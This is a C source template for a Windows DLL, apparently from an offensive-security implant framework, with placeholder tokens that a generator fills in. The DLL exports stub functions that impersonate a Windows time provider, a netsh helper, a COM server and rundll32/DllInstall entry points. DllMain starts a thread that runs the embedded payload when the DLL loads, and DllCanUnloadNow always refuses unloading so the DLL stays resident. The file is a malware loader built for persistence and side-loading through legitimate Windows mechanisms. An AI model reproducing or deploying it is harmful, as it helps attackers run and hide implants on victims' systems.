// Copyright (C) 2020 - 2024 iDigitalFlame
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.
//

#define WINVER 0x0501
#define _WIN32_WINNT 0x0501

#define NOWH
#define NOMB
#define NOGDI
#define NOMSG
#define NONLS
#define NOMCX
#define NOIME
#define NOHELP
#define NOCOMM
#define NOICONS
#define NOCRYPT
#define NOKANJI
#define NOSOUND
#define NOCOLOR
#define NOMENUS
#define NOCTLMGR
#define NOMINMAX
#define NOSCROLL
#define NODRAWTEXT
#define NOMETAFILE
#define NOPROFILER
#define NOKEYSTATES
#define NORASTEROPS
#define NOCLIPBOARD
#define NOWINSTYLES
#define NOSYSMETRICS
#define NOWINOFFSETS
#define NOSHOWWINDOW
#define NOTEXTMETRIC
#define NOSYSCOMMANDS
#define NOGDICAPMASKS
#define NOWINMESSAGES
#define NODEFERWINDOWPOS
#define NOVIRTUALKEYCODES
#define WIN32_LEAN_AND_MEAN

#define UNICODE
#define EXPORT __declspec(dllexport)

#include <windows.h>
#include <winsock.h>
#include <timeprov.h>

#include "flurry.h"

DWORD $thread(void) {
    Sleep(1000);
    $export();
    return 0;
}

EXPORT HRESULT WINAPI VoidFunc(void) {
    $secondary();
}
EXPORT HRESULT WINAPI DllCanUnloadNow(void) {
    // Always return S_FALSE so we can stay loaded.
    return 1;
}
EXPORT HRESULT WINAPI DllRegisterServer(void) {
    $export();
}
EXPORT HRESULT WINAPI DllUnregisterServer(void) {
    $export();
}
EXPORT HRESULT WINAPI DllInstall(BOOL b, PCWSTR i) {
    $export();
}
EXPORT HRESULT WINAPI TimeProvClose(TimeProvHandle p) {
    return 0;
}
EXPORT HRESULT WINAPI RegisterModule(DWORD v, void *m, void *g) {
    return 0;
}
EXPORT HRESULT WINAPI DllGetClassObject(void *x, void *i, void *p) {
    $export();
}
EXPORT HRESULT WINAPI TimeProvCommand(TimeProvHandle h, TimeProvCmd c, PVOID a) {
    return 0;
}
EXPORT HRESULT WINAPI TimeProvOpen(WCHAR *n, TimeProvSysCallbacks *c, TimeProvHandle *p) {
    *p = (TimeProvHandle)1;
    return 0;
}

EXPORT VOID WINAPI $funcname(HWND h, HINSTANCE i, LPSTR a, int s) {
    $secondary();
}

EXPORT DWORD WINAPI InitHelperDll(DWORD v, PVOID r) {
    return 0;
}

EXPORT BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID args) {
    if (r == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(h);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)$thread, NULL, 0, NULL);
    }
    if (r == DLL_PROCESS_DETACH) {
        // GenerateConsoleCtrlEvent(1, 0); // Generate a SIGTERM signal to tell Go to exit cleanly.
    }
    return TRUE;
}
